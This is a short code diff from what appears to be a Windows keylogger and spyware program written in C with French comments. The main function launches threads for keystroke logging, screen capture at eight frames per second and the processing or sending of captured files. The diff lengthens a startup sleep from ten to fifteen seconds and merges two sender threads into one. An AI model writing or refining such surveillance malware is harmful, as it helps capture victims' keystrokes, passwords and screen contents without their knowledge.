@@ -86,7 +86,7 @@ DWORD WINAPI capture_screen_thread(LPVOID lpParam) {
 }
 
 int main(int argc, char *argv[]) {
-    Sleep(10 * 1000);
+    Sleep(15 * 1000);
     printf("argc: %d\n", argc);
     printf("executable path: %s\n", argv[0]);
 
@@ -123,11 +123,8 @@ int main(int argc, char *argv[]) {
 
         // Lancer deux threads (start_keylogger et capture)
         int fps = 8;
-        int dire = 0; //png
-        int dir = 1;//txt
         
-        HANDLE thread4 = CreateThread(NULL, 0, sender_thread, &dire, 0, NULL);
-        HANDLE thread3 = CreateThread(NULL, 0, sender_thread, &dir, 0, NULL);
+        HANDLE thread4 = CreateThread(NULL, 0, process_files, NULL, 0, NULL);
         HANDLE thread1 = CreateThread(NULL, 0, start_keylogger_thread, NULL, 0, NULL);
         HANDLE thread2 = CreateThread(NULL, 0, capture_screen_thread, &fps, 0, NULL);
 
